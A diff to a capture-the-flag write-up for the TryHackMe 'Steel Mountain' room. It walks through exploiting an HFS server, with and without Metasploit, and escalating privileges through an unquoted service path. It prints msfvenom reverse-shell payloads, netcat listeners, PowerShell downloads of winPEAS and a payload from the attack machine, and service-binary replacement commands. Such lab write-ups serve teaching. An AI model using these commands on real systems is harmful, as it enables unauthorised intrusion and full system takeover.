@@ -1,6 +1,8 @@
 # Steel Mountain
 
-[![Steel Mountain](../../_static/images/steel-mountain.png)](https://tryhackme.com/room/steelmountain)
+| [![Steel Mountain](../../_static/images/steel-mountain.png)](https://tryhackme.com/room/steelmountain) |
+|:--:|
+| [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain) |
 
 ## Attack tree
 
@@ -154,7 +156,6 @@ Papers: No Results
 There are several exploits possible for version 2.3.x. 
 [Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) gives the CVE.
 
-## Privilege escalation with metasploit
 
 ```text
 # msfconsole
@@ -189,19 +190,20 @@ meterpreter >
 
 Okay, got meterpreter. Find the flag (`search -f *.txt`) and continue. 
 
+## Privilege escalation with metasploit
+
 [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is a script that can be 
 used to enumerate a Windows machine.
 
 ```text
-meterpreter > upload /home/nina/Downloads/PowerUp.ps1
+meterpreter > upload /home/<kaliuser>/Downloads/PowerUp.ps1
 meterpreter > load powershell
 meterpreter > powershell_shell
 PS > . .\PowerUp.ps1
 PS > Invoke-AllChecks
 ```
 
-A looong list. `AdvancedSystemCareService9` has an unquoted service path vulnerability, 
-the directory to the application is write-able, AND it has the `CanRestart` option `True`.
+A looong list. 
 
 ```text
 ServiceName    : AdvancedSystemCareService9
@@ -212,9 +214,10 @@ AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <H
 CanRestart     : True
 ```
 
-The legitimate application can be replaced with another one.
+`AdvancedSystemCareService9` has an unquoted service path vulnerability, the directory to the application is 
+writeable, AND it has the `CanRestart` option `True`. The legitimate application can be replaced with another one.
 
-Create payload:
+Create payload on the attack machine:
 
 ```text
 # msfvenom -p windows/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
@@ -224,15 +227,15 @@ Create payload:
 Saved as: Advanced.exe
 ```
 
-Upload to target machine:
+Upload payload to target machine:
 
 ```text
-meterpreter > upload /home/nina/Downloads/Advanced.exe
+meterpreter > upload /home/<kaliuser>/Downloads/Advanced.exe
 ```
 
 Start a listener on the attack machine:
 
-    nc -lvnp 4443
+    # nc -lvnp 4443
 
 Switch to a shell, stop service, replace executable, and start service:
 
@@ -251,3 +254,76 @@ And when the connection is made, get the root flag:
     type root.txt
 
 ## Access and escalation without metasploit
+
+### Initial access
+
+[Download the exploit](https://www.exploit-db.com/raw/39161) by copying the raw text and rename it into something like
+`39161.py`. Edit the script: Set the local IP address and Port to those of the attack machine. The script 
+is a python2 script. It will not work with python3 without editing.
+
+The payload script uses port 80 for the file web server by default. If the 80 port is in use by another service, 
+add `+":8000"+` after the `ip_addr` variable in that long `vbs` parameter. 
+
+On Kali, in `~/Downloads`, copy the netcat binary from `/usr/share/windows-binaries/nc.exe` 
+
+    # cp /usr/share/windows-binaries/nc.exe .
+
+If not on Kali, [Download the netcat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) and 
+rename it to `nc.exe` to work with the exploit script.
+
+On the attack machine, in a second terminal in the directory with the exploit (`~/Downloads`), start a Python web 
+server: 
+
+    # python3 -m http.server 80
+
+Start a netcat listener on the attack machine in a third terminal:
+
+    # nc -lvnp 443
+
+There are now 3 terminal tabs open: One running the exploit, one running the python http server, and one running 
+the netcat listener.
+
+Run the exploit in the first terminal. The script has to be run twice for it to work. The first time will pull the 
+netcat binary to the target and the second time will execute the payload to gain a callback within the listener:
+
+    # python2 39161.py <IP address target machine> 8080
+    # python2 39161.py <IP address target machine> 8080
+
+### Escalation
+
+[Download a WINPEAS binary](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and put it in 
+`~/Downloads` where the `http.server` is running.
+
+Get it in the shell from the server:
+
+    cd C:\Users\Bill\Desktop
+    powershell -c wget "http://<IP address attack machine>/winPEAS.exe" -outfile "winPEAS.exe"
+
+Execute winPEAS:
+
+    winPEAS.exe
+
+It has found some unquoted service paths. Just like PowerUp did.
+
+Create a payload with `msfvenom` in the `~/Downloads` directory:
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+
+Pull to the system via PowerShell:
+
+    powershell -c wget "http://<IP address attack machine>/ASCService.exe" -outfile "ASCService.exe"
+
+Open a fourth terminal, with another listener:
+
+    nc -lvnp 4443
+
+Stop, replace executable and start the service:
+
+    sc stop AdvancedSystemCareService9
+    copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+    sc start AdvancedSystemCareService9
+
+And when the connection is made, get the root flag:
+
+    C:\Users\Administrator\Desktop>type root.txt
+    type root.txt
